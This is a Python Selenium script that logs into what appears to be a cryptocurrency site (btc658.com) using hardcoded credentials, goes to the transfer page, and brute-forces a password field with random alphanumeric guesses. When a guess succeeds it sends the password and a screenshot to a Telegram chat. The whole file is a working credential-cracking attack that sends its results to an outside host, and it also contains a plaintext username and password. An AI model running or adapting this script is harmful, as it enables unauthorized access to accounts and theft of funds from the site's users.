import time
import random
import string
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from PIL import Image
import telebot

# Telegram Setup
BOT_TOKEN = 'your_bot_token_here'
CHAT_ID = 'your_chat_id_here'
bot = telebot.TeleBot(BOT_TOKEN)

def generate_password():
    length = random.randint(4, 10)
    characters = string.ascii_letters + string.digits
    return ''.join(random.sample(characters, length))

options = Options()
options.add_argument('--headless')
options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')

driver = webdriver.Chrome(options=options)

driver.get("https://btc658.com/pages/user/other/userLogin")
time.sleep(2)
driver.find_element(By.ID, "account").send_keys("NOMANE")
driver.find_element(By.ID, "password").send_keys("pd789456")
driver.find_element(By.CLASS_NAME, "login-btn").click()
time.sleep(4)

driver.get("https://btc658.com/pages/user/transfer")
time.sleep(2)

record_button = driver.find_element(By.XPATH, '//*[@id="app"]/div/div[2]/div/div[1]/div[3]')
record_button.click()
time.sleep(2)

used = set()
while True:
    password = generate_password()
    if password in used:
        continue
    used.add(password)
    try:
        pass_input = driver.find_element(By.XPATH, '//input[@type="password"]')
        pass_input.clear()
        pass_input.send_keys(password)
        time.sleep(1)
        driver.find_element(By.CLASS_NAME, "el-button--primary").click()
        time.sleep(2)
        if "success" in driver.page_source.lower():
            driver.save_screenshot("success.png")
            with open("success.png", "rb") as img:
                bot.send_message(CHAT_ID, f"✅ Password mil gaya: {password}")
                bot.send_photo(CHAT_ID, img)
            break
    except Exception as e:
        print("Error:", e)
    time.sleep(2)
